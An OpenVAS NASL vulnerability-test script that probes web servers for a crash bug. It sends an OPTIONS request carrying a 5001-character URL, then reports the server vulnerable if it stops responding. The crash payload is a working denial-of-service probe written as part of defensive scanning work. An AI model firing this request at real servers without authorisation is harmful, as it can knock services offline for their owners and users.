###############################################################################
# OpenVAS Vulnerability Test
# $Id: www_too_long_options.nasl 4797 2016-12-17 14:04:59Z cfi $
#
# Too long OPTIONS parameter
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Some vulnerable servers:
# VisNetic WebSite 3.5.13.1
#
# References:
#
# Date: Fri, 13 Dec 2002 09:25:00 +0100
# From:"Peter Kruse" <kruse@KRUSESECURITY.DK>
# Subject: VisNetic WebSite Denial of Service
# To:NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11235");
  script_version("$Revision: 4797 $");
  script_tag(name:"last_modification", value:"$Date: 2016-12-17 15:04:59 +0100 (Sat, 17 Dec 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("Too long OPTIONS parameter");
  script_category(ACT_DENIAL);
  # All the www_too_long_*.nasl scripts were first declared as
  # ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
  # The web server might be killed by those generic tests before OpenVAS
  # has a chance to perform known attacks for which a patch exists
  # As ACT_DENIAL are performed one at a time (not in parallel), this reduces
  # the risk of false positives.
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www",80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your web server.");

  script_tag(name:"summary", value:"It may be possible to make the web server crash or even
  execute arbitrary code by sending it a too long url through the OPTIONS method.");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port( default:80 );

if( http_is_dead( port:port, retry:4 ) ) exit( 0 );

# We need a simple http_request function. However, for NASL1, let's do this:
req = http_get( port:port, item:"/" + crap( 5001 ) + ".html" );
req = ereg_replace( string:req, pattern:"^GET", replace:"OPTIONS" );
http_send_recv( port:port, data:req );

sleep( 5 );

if( http_is_dead( port:port, retry:4 ) ) {
  security_message( port:port );
  # set_kb_item( name:"www/too_long_url_crash", value:TRUE );
  exit( 0 );
}

exit( 99 );
